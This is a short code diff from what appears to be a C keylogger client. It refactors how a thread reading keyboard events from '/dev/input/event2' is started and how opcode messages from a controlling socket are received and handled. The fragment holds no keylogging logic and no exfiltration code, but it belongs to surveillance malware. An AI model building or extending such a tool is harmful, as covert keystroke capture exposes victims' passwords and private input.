@@ -22,26 +22,25 @@ int main() {
     
     //start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
 
-    pthread_t tid;
-    keyLoggerParameters_t* params = (keyLoggerParameters_t*)malloc(sizeof(keyLoggerParameters_t));
-    params->sock = sock;
-    strcpy(params->keyboardFile, "/dev/input/event2");
+    strcpy(clientData.keyLoggerInputFile, "/dev/input/event2");
+    clientData.isKeyLoggerActive = 0;
 
-    if (pthread_create(&tid, NULL, start_keylogger, params) < 0) {
+    if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0) {
         perror("Could not create thread");
-        free(params);
     }
-    pthread_detach(tid);
+    pthread_detach(clientData.keyLoggerTid);
 
-
-    char buffer[SEND_BUFFER_SIZE];
-    ssize_t bytesRecv;
+    sleep(1);
     message_t msg;
+    msg.opCode = 'S';
+    msg.size = 0;
+    handleOpcode(msg);
     while(1)
     {
-        if(recvMessage(sock, &msg) < 0)
+        if(recvMessage(sock, &msg) <= 0)
             break;
-        handleOpcode(sock, msg);
+        printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
+        handleOpcode(msg);
 
     }
     // Pornire Keylogger
